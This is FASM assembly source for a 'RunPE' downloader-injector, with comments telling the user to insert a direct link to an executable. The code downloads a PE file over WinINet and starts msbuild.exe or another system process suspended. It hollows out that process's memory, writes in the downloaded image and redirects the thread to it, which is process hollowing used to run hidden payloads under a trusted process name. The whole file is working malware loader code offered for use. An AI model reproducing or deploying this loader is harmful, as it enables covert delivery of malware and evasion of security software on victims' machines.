format PE GUI 4.0

; Author : Suleiman Al-Othman || twitter, github (@sulealothman)
; Ver. : 0.1
; Project : Downloader Inject PE File in Other Process Memory (RunPE)
; Supported .net/native
; How use? Replace [DIRECTLINK_EXE] with your direct link exe
; Select process inject .. .net => msbuild, regasm || native => cmd, calc, svchost .. etc
; Fasm
 
include 'win32ax.inc'

IMAGE_SIZEOF_SHORT_NAME = 8

struct IMAGE_DOS_HEADER
    e_magic           dw      ?
    e_cblp            dw      ?
    e_cp              dw      ?
    e_crlc            dw      ?
    e_cparhdr         dw      ?
    e_minalloc        dw      ?
    e_maxalloc        dw      ?
    e_ss              dw      ?
    e_sp              dw      ?
    e_csum            dw      ?
    e_ip              dw      ?
    e_cs              dw      ?
    e_lfarlc          dw      ?
    e_ovno            dw      ?
    e_res             rw      4
    e_oemid           dw      ?
    e_oeminfo         dw      ?
    e_res2            rw      10
    e_lfanew          dd      ?
ends

struct IMAGE_FILE_HEADER
    Machine               dw    ?
    NumberOfSections      dw    ?
    TimeDateStamp         dd    ?
    PointerToSymbolTable  dd    ?
    NumberOfSymbols       dd    ?
    SizeOfOptionalHeader  dw    ?
    Characteristics       dw    ?
ends

struct IMAGE_DATA_DIRECTORY
    VirtualAddress    dd      ?
    isize             dd      ?
ends

struct IMAGE_OPTIONAL_HEADER
    Magic                         dw       ?
    MajorLinkerVersion            db       ?
    MinorLinkerVersion            db       ?
    SizeOfCode                    dd       ?
    SizeOfInitializedData         dd       ?
    SizeOfUninitializedData       dd       ?
    AddressOfEntryPoint           dd       ?
    BaseOfCode                    dd       ?
    BaseOfData                    dd       ?
    ImageBase                     dd       ?
    SectionAlignment              dd       ?
    FileAlignment                 dd       ?
    MajorOperatingSystemVersion   dw       ?
    MinorOperatingSystemVersion   dw       ?
    MajorImageVersion             dw       ?
    MinorImageVersion             dw       ?
    MajorSubsystemVersion         dw       ?
    MinorSubsystemVersion         dw       ?
    Win32VersionValue             dd       ?
    SizeOfImage                   dd       ?
    SizeOfHeaders                 dd       ?
    CheckSum                      dd       ?
    Subsystem                     dw       ?
    DllCharacteristics            dw       ?
    SizeOfStackReserve            dd       ?
    SizeOfStackCommit             dd       ?
    SizeOfHeapReserve             dd       ?
    SizeOfHeapCommit              dd       ?
    LoaderFlags                   dd       ?
    NumberOfRvaAndSizes           dd       ?
    DataDirectory                             rb (sizeof.IMAGE_DATA_DIRECTORY*16)
ends

struct IMAGE_NT_HEADERS
    Signature         dd                       ?
    FileHeader        IMAGE_FILE_HEADER        ?    
    OptionalHeader    IMAGE_OPTIONAL_HEADER  ?
ends

struct IMAGE_EXPORT_DIRECTORY
    Characteristics dd      ?
    TimeDateStamp   dd      ?
    MajorVersion    dw      ?
    MinorVersion    dw      ?
    Name_   dd      ?
    Base    dd      ?
    NumberOfFunctions       dd      ?
    NumberOfNames   dd      ?
    AddressOfFunctions      dd      ?
    AddressOfNames  dd      ?
    AddressOfNameOrdinals   dd      ?
ends

struct FLOATING_SAVE_AREA
    ControlWord dd ?
    StatusWord dd ?
    TagWord dd ?
    ErrorOffset dd ?
    ErrorSelector dd ?
    DataOffset dd ?
    DataSelector dd ?
    RegisterArea rb (80)
    Cr0NpxState dd ?
ends

struct CONTEXT
    ContextFlags dd ?
    Dr0 dd ?
    Dr1 dd ?
    Dr2 dd ?
    Dr3 dd ?
    Dr6 dd ?
    Dr7 dd ?
    FloatSave FLOATING_SAVE_AREA
    regGs dd ?
    regFs dd ?
    regEs dd ?
    regDs dd ?
    regEdi dd ?
    regEsi dd ?
    regEbx dd ?
    regEdx dd ?
    regEcx dd ?
    regEax dd ?
    regEbp dd ?
    regEip dd ?
    regCs dd ?
    regFlag dd ?
    regEsp dd ?
    regSs dd ?
    ExtendedRegisters rb (256)
ends

struct IMAGE_SECTION_HEADER
    _Name db IMAGE_SIZEOF_SHORT_NAME dup (?)
    union
        PhysicalAddress     dd ?
        VirtualSize         dd ?
    ends
    VirtualAddress        dd ?
    SizeOfRawData         dd ?
    PointerToRawData      dd ?
    PointerToRelocations  dd ?
    PointerToLinenumbers  dd ?
    NumberOfRelocations   dw ?
    NumberOfLinenumbers   dw ?
    Characteristics       dd ?
ends


.data

windir db "windir",0
;injectPath db "\system32\cmd.exe",0
injectPath db "\Microsoft.NET\Framework\v2.0.50727\msbuild.exe",0

PI PROCESS_INFORMATION
SPI STARTUPINFO

fullInjectPath rb 256d

baseAddr dd ?
exeAddr dd ?
pNTHeader dd ?
url db "[DIRECTLINK_EXE]",0
szAgent db 'GUEST',0

InternetHandle dd ?
FileHandle dd ?
readBytes dd ?
pExe rb 3072*1024+4
exeSize rb 3072*1024+4

.code

    start:
    
        invoke GetEnvironmentVariable, windir, fullInjectPath, MAX_PATH
        invoke lstrcat, fullInjectPath, injectPath
        stdcall RunPeExe, fullInjectPath 
 
        invoke ExitProcess, 0
 
    .end start

    proc RunPeExe injectPath
        local kerDll:DWORD,\
        ntDll:DWORD,\
        wininetDll:DWORD,\
        pCreateProcessA:DWORD,\
        pVirtualAllocEx:DWORD,\
        pCloseHandle:DWORD,\
        pTerminateProcess:DWORD,\
        NtUnmapViewOfSection:DWORD,\
        NtReadVirtualMemory:DWORD,\
        NtWriteVirtualMemory:DWORD,\
        NtGetContextThread:DWORD,\
        NtSetContextThread:DWORD,\
        NtResumeThread:DWORD,\
        InternetOpen:DWORD,\
        InternetOpenUrl:DWORD,\
        InternetReadFile:DWORD,\
        InternetCloseHandle:DWORD,\
        CTX:CONTEXT,\
        
        
        invoke LoadLibraryA, 'kernel32.dll'
        MOV [kerDll], EAX

        invoke LoadLibraryA, 'ntdll.dll'
        MOV [ntDll], EAX

        invoke LoadLibraryA, 'wininet.dll'
        MOV [wininetDll], EAX
        

        invoke GetProcAddress, [kerDll], "CreateProcessA"
        MOV [pCreateProcessA], EAX
        invoke pCreateProcessA, [injectPath], 0, 0, 0, 0, 4, 0, 0, SPI, PI


        invoke GetProcAddress, [ntDll], "NtGetContextThread"
        MOV [NtGetContextThread], EAX
        MOV [CTX.ContextFlags], 0x10007
        LEA EAX, [CTX]
        invoke NtGetContextThread, [PI.hThread] , EAX

   
        invoke GetProcAddress, [ntDll], "NtReadVirtualMemory"
        MOV [NtReadVirtualMemory], EAX
        invoke NtReadVirtualMemory, [PI.hProcess], DWORD [CTX.regEbx] + 8, [baseAddr], 4, 0
  
        invoke GetProcAddress, [wininetDll], "InternetOpenA"
        MOV [InternetOpen], EAX

        invoke GetProcAddress, [wininetDll], "InternetOpenUrlA"
        MOV [InternetOpenUrl], EAX

        invoke InternetOpen, szAgent, 0, 0, 0, 0
        MOV [InternetHandle], EAX



        invoke InternetOpenUrl, EAX, url, 0, 0, 0, 0
        MOV [FileHandle], EAX

        invoke GetProcAddress, [wininetDll], "InternetReadFile"
        MOV [InternetReadFile], EAX
        invoke InternetReadFile, [FileHandle], pExe, exeSize, readBytes
        MOV EAX, [readBytes]
        MOV BYTE[pExe+EAX], 0

        invoke GetProcAddress, [wininetDll], "InternetCloseHandle"
        MOV [InternetCloseHandle], EAX
        invoke InternetCloseHandle, [FileHandle]
        invoke InternetCloseHandle, [InternetHandle]

        MOV EAX, pExe
        MOV ESI, EAX
        ADD ESI, [EAX + IMAGE_DOS_HEADER.e_lfanew]
        MOV [pNTHeader], ESI

        invoke GetProcAddress, [kerDll], "VirtualAllocEx"
        MOV [pVirtualAllocEx], EAX

        invoke GetProcAddress, [ntDll], "NtUnmapViewOfSection"
        MOV [NtUnmapViewOfSection], EAX

        .ALLOC:
        invoke pVirtualAllocEx, [PI.hProcess], [ESI + IMAGE_NT_HEADERS.OptionalHeader.ImageBase], [ESI + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], 003000h, 0x40
        .if ~EAX
               invoke NtUnmapViewOfSection, [PI.hProcess], [baseAddr]
            JMP .ALLOC
            
        .endif
        
        MOV [exeAddr], EAX
     
        invoke GetProcAddress, [ntDll], "NtWriteVirtualMemory"
        MOV [NtWriteVirtualMemory], EAX
        MOV EDX, [pNTHeader]
        invoke NtWriteVirtualMemory, [PI.hProcess], [exeAddr], pExe, [EDX + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders], 0
        
        MOV EDX, [pNTHeader]
        MOVZX ECX, WORD [EDX + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        MOVZX ESI, WORD [EDX + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        ADD ESI, sizeof.IMAGE_NT_HEADERS.FileHeader + 4
        ADD ESI, [pNTHeader]
        
        .lp:
            MOV EAX, [exeAddr]
            ADD EAX, DWORD [ESI + IMAGE_SECTION_HEADER.VirtualAddress]
            MOV EDX, pExe
            ADD EDX, DWORD [ESI + IMAGE_SECTION_HEADER.PointerToRawData]
            
            PUSH ECX ESI
            invoke NtWriteVirtualMemory, [PI.hProcess], EAX, EDX, [ESI + IMAGE_SECTION_HEADER.SizeOfRawData], 0
            POP ESI ECX
            
            ADD ESI, sizeof.IMAGE_SECTION_HEADER
        LOOP .lp
        
        MOV EAX, [CTX.regEbx]
        ADD EAX, 8
        LEA EDX, [exeAddr]
        invoke NtWriteVirtualMemory, [PI.hProcess], EAX, EDX, 4, 0
        
        MOV EDX, [pNTHeader]
        MOV EDX, [EDX + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
        ADD EDX, [exeAddr]
        MOV [CTX.regEax], EDX
        
        invoke GetProcAddress, [ntDll], "NtSetContextThread"
        MOV [NtSetContextThread], EAX
        LEA EAX, [CTX]
        invoke NtSetContextThread,[PI.hThread], EAX

        invoke GetProcAddress, [ntDll], "NtResumeThread"
        MOV [NtResumeThread], EAX
        invoke NtResumeThread, [PI.hThread], 0

        ret
    endp